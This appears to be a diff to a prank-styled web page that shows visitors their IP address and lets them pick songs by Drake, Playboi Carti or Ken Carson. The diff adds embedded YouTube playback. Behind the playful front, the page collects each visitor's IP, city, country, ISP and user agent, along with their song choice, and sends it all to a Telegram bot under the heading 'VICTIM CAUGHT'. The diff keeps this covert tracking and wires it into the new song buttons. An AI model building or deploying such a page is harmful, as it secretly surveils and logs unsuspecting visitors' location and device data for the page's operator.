@@ -120,9 +120,6 @@
       border: 3px solid #ff0000;
       border-radius: 20px;
       padding: 20px;
-      display: flex;
-      align-items: center;
-      gap: 15px;
       color: #fff;
       font-family: 'Orbitron', sans-serif;
       font-size: 1.5rem;
@@ -130,6 +127,7 @@
       box-shadow: 0 0 30px rgba(255,0,0,0.5);
       transition: all 0.4s;
       cursor: pointer;
+      text-align: center;
     }
     .artist-btn:hover {
       background: #ff0000;
@@ -137,13 +135,34 @@
       transform: scale(1.05);
       box-shadow: 0 0 50px #ff0000;
     }
-    .artist-img {
-      width: 80px;
-      height: 80px;
+
+    /* SONG SECTION */
+    .songs {
+      display: none;
+      flex-direction: column;
+      gap: 15px;
+      margin-top: 20px;
+    }
+    .song-btn {
+      background: rgba(255,0,0,0.2);
+      border: 2px solid #ff0000;
       border-radius: 15px;
-      object-fit: cover;
-      border: 3px solid #ff3333;
-      box-shadow: 0 0 20px #ff0000;
+      padding: 15px;
+      color: #fff;
+      font-size: 1.3rem;
+      text-shadow: 0 0 5px #ff0000;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .song-btn:hover {
+      background: #ff0000;
+      color: #000;
+      transform: scale(1.05);
+    }
+    #player {
+      margin-top: 20px;
+      width: 100%;
+      height: 200px;
     }
   </style>
 </head>
@@ -161,7 +180,7 @@
 
       <!-- STEP 1: IP -->
       <div id="result-ip" class="result hidden">
-        This is ur ip adress if u didnt know <span style="font-size:2.2rem">tongue_stuck_out:</span><br>
+        This is ur ip adress if u didnt know <span style="font-size:2.2rem">😭👅</span><br>
         <span id="ip" style="color:#ff0000; font-size:1.8rem;">...</span>
         <br><br>
         <button class="btn" onclick="revealLocation()">CLICK ME FOR ANOTHER SURPRISE</button>
@@ -181,24 +200,35 @@
 
   <!-- ARTIST CHOICE (SCROLL DOWN) -->
   <div class="artists">
-    <!-- DRAKE - Certified Lover Boy -->
-    <div class="artist-btn" onclick="chooseArtist('Drake')">
-      <img src="https://i.scdn.co/image/ab67616d0000b273b8d72a5b5a0d5c7b7c1f3e1d" class="artist-img" alt="Drake - CLB">
-      <span>DRAKE</span>
+    <div class="artist-btn" onclick="showSongs('drake')">
+      DRAKE
+    </div>
+    <div class="songs" id="drake-songs">
+      <div class="song-btn" onclick="playSong('Look What You\'ve Done', 'https://www.youtube.com/watch?v=5H7CS-_RUe8')">Look What You've Done</div>
+      <div class="song-btn" onclick="playSong('Marvins Room', 'https://www.youtube.com/watch?v=JDb3ZZD4bA0')">Marvins Room</div>
+      <div class="song-btn" onclick="playSong('Doing It Wrong', 'https://www.youtube.com/watch?v=GmZsYYI1Vnc')">Doing It Wrong</div>
     </div>
 
-    <!-- PLAYBOI CARTI - Whole Lotta Red -->
-    <div class="artist-btn" onclick="chooseArtist('Playboi Carti')">
-      <img src="https://upload.wikimedia.org/wikipedia/en/2/2a/Playboi_Carti_-_Whole_Lotta_Red.png" class="artist-img" alt="Carti - WLR">
-      <span>PLAYBOI CARTI</span>
+    <div class="artist-btn" onclick="showSongs('carti')">
+      PLAYBOI CARTI
+    </div>
+    <div class="songs" id="carti-songs">
+      <div class="song-btn" onclick="playSong('Sky', 'https://www.youtube.com/watch?v=GYE9H4SMq5E')">Sky</div>
+      <div class="song-btn" onclick="playSong('Fell In Luv', 'https://www.youtube.com/watch?v=HRbgGQ7rHi0')">Fell In Luv</div>
+      <div class="song-btn" onclick="playSong('Rockstar Made', 'https://www.youtube.com/watch?v=EwdsnGfrd-k')">Rockstar Made</div>
     </div>
 
-    <!-- KEN CARSON - More Chaos -->
-    <div class="artist-btn" onclick="chooseArtist('Ken Carson')">
-      <img src="https://upload.wikimedia.org/wikipedia/en/2/2f/Ken_Carson_More_Chaos.jpg" class="artist-img" alt="Ken - More Chaos">
-      <span>KEN CARSON</span>
+    <div class="artist-btn" onclick="showSongs('ken')">
+      KEN CARSON
+    </div>
+    <div class="songs" id="ken-songs">
+      <div class="song-btn" onclick="playSong('Ss', 'https://www.youtube.com/watch?v=TMzs6GvsZXU')">Ss</div>
+      <div class="song-btn" onclick="playSong('Yale', 'https://www.youtube.com/watch?v=ppUGaXd9pzY')">Yale</div>
+      <div class="song-btn" onclick="playSong('Liveleak', 'https://www.youtube.com/watch?v=RKN4NTPGJxY')">Liveleak</div>
     </div>
   </div>
+
+  <div id="player" class="hidden"></div>
 
   <script>
     // === RED CIRCLES ===
@@ -221,7 +251,7 @@
     let userIP = "";
 
     // === SEND TO TELEGRAM ===
-    function sendToTelegram(ip, city = "", country = "", isp = "", device = "", artist = "") {
+    function sendToTelegram(ip, city = "", country = "", isp = "", device = "", song = "") {
       const site = location.href;
       let message = 
 `VICTIM CAUGHT
@@ -233,13 +263,13 @@ ISP: <b>${isp || "Unknown"}</b>
 Device: <code>${device}</code>
 Site: <a href="${site}">${site}</a>`;
 
-      if (artist) message += `\nChose Artist: <b>${artist}</b>`;
+      if (song) message += `\nChose Song: <b>${song}</b>`;
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`)
         .catch(() => {});
     }
 
-    // === GET IP ===
+    // === STEP 1: GET IP ===
     function getIP() {
       fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
@@ -254,7 +284,7 @@ Site: <a href="${site}">${site}</a>`;
         });
     }
 
-    // === GET LOCATION + ISP ===
+    // === STEP 2: GET CITY + COUNTRY + ISP ===
     function getLocation() {
       fetch(`https://ipapi.co/${userIP}/json/`)
         .then(r => r.json())
@@ -294,11 +324,23 @@ Site: <a href="${site}">${site}</a>`;
       getLocation();
     }
 
-    // === ARTIST CHOICE ===
-    function chooseArtist(artist) {
-      alert(`You chose: ${artist} fire`);
+    // === SHOW SONGS ===
+    function showSongs(artist) {
+      document.getElementById('drake-songs').style.display = 'none';
+      document.getElementById('carti-songs').style.display = 'none';
+      document.getElementById('ken-songs').style.display = 'none';
+
+      document.getElementById(`${artist}-songs`).style.display = 'flex';
+    }
+
+    // === PLAY SONG + SEND TO TELEGRAM ===
+    function playSong(song, url) {
+      const player = document.getElementById('player');
+      player.innerHTML = `<iframe width="100%" height="200" src="${url.replace('watch?v=', 'embed/')}?autoplay=1" frameborder="0" allow="autoplay"></iframe>`;
+      player.classList.remove('hidden');
+
       const device = navigator.userAgent.substring(0, 80);
-      sendToTelegram(userIP, "", "", "", device, artist);
+      sendToTelegram(userIP, "", "", "", device, song);
     }
   </script>
 </body>
